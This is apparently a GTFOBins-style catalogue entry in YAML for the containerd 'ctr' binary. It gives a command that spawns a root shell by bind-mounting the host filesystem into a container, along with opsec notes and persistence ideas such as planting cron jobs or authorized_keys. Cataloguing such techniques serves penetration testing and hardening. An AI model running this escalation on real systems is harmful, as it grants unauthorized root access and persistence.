---
name: ctr
capabilities:
- exec
- spawn
required_permissions:
  level: suid
  notes: Requires SUID bit set on the binary.
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  notes: ''
persistence_potential: true
examples:
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: ctr run --rm --mount type=bind,src=/,dst=/,options=rbind -t docker.io/library/alpine:latest x
  notes: |-
    An image must be already present, for example:

    ```
    ctr images pull docker.io/library/alpine:latest
    ```
references:
- https://gtfobins.github.io/gtfobins/ctr/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
